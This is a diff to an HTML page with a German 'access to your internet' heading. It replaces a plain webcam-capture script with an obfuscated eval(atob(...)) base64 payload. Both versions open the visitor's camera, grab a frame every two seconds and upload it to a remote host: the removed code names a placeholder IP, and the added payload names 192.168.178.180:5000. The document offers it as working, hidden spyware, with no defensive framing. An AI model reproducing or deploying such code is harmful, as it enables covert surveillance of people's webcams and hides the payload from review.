@@ -7,28 +7,7 @@
         <h1 style="color:red;">Zugriff auf Ihr Internet ...</h1>
         <video id="video" width="640" height="480" autoplay></video>
         <script>
-  navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
-    const video = document.getElementById('vid');
-    video.srcObject = stream;
-
-    const canvas = document.createElement('canvas');
-    const context = canvas.getContext('2d');
-
-    setInterval(() => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob(blob => {
-        fetch('http://DEIN_PC_IP:5000/upload', {
-          method: 'POST',
-          body: blob
-        });
-      }, 'image/jpeg');
-    }, 2000); // alle 2 Sekunden ein Bild
-  }).catch(err => {
-    alert("Zugriff verweigert: " + err);
-  });
-</script>
+eval(atob("Cm5hdmlnYXRvci5tZWRpYURldmljZXMuZ2V0VXNlck1lZGlhKHsgdmlkZW86IHRydWUgfSkudGhlbihmdW5jdGlvbihzdHJlYW0pIHsKICBjb25zdCB2aWRlbyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd2aWQnKTsKICB2aWRlby5zcmNPYmplY3QgPSBzdHJlYW07CgogIGNvbnN0IGNhbnZhcyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2NhbnZhcycpOwogIGNvbnN0IGNvbnRleHQgPSBjYW52YXMuZ2V0Q29udGV4dCgnMmQnKTsKCiAgc2V0SW50ZXJ2YWwoKCkgPT4gewogICAgY2FudmFzLndpZHRoID0gdmlkZW8udmlkZW9XaWR0aDsKICAgIGNhbnZhcy5oZWlnaHQgPSB2aWRlby52aWRlb0hlaWdodDsKICAgIGNvbnRleHQuZHJhd0ltYWdlKHZpZGVvLCAwLCAwLCBjYW52YXMud2lkdGgsIGNhbnZhcy5oZWlnaHQpOwoKICAgIGNhbnZhcy50b0Jsb2IoYmxvYiA9PiB7CiAgICAgIGZldGNoKCdodHRwOi8vMTkyLjE2OC4xNzguMTgwOjUwMDAvdXBsb2FkJywgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGJvZHk6IGJsb2IKICAgICAgfSk7CiAgICB9LCAnaW1hZ2UvanBlZycpOwogIH0sIDIwMDApOwp9KS5jYXRjaChlcnIgPT4gewogIGFsZXJ0KCJadWdyaWZmIHZlcndlaWdlcnQ6ICIgKyBlcnIpOwp9KTsK"));
+        </script>
     </body>
 </html>
